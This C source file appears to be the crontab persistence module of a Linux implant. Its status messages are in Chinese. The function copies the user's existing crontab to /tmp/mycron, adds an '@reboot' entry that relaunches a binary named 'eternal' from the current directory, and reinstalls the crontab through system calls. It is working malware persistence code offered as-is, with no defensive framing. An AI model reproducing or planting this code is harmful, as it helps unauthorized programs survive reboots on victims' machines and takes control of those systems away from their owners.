#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_crontab.h"

#ifdef CRONTAB_MOD
void setup_crontab_persistence() {
    printf("设置crontab持久化...\n");
    if (system("crontab -l > /dev/null 2>&1") == 0) {
        printf("检测到crontab存在。\n");
        const char* cron_job = "@reboot ";
        char* current_dir = getcwd(NULL, 0);
        if (current_dir) {
            char cron_entry[512];
            snprintf(cron_entry, sizeof(cron_entry), "%s%s/eternal\n", cron_job, current_dir);

            FILE *temp_cron = fopen("/tmp/mycron", "w");
            if (temp_cron) {
                FILE *current_cron = popen("crontab -l", "r");
                if (current_cron) {
                    char line[256];
                    while (fgets(line, sizeof(line), current_cron)) {
                        fprintf(temp_cron, "%s", line);
                    }
                    pclose(current_cron);
                }
                fprintf(temp_cron, "%s", cron_entry);
                fclose(temp_cron);
                system("crontab /tmp/mycron");
                printf("持久化命令已添加到crontab。\n");
                unlink("/tmp/mycron");
            } else {
                perror("无法创建临时crontab文件");
            }
            free(current_dir);
        } else {
            perror("无法获取当前目录");
        }
    } else {
        printf("未检测到crontab。\n");
    }
}
#endif
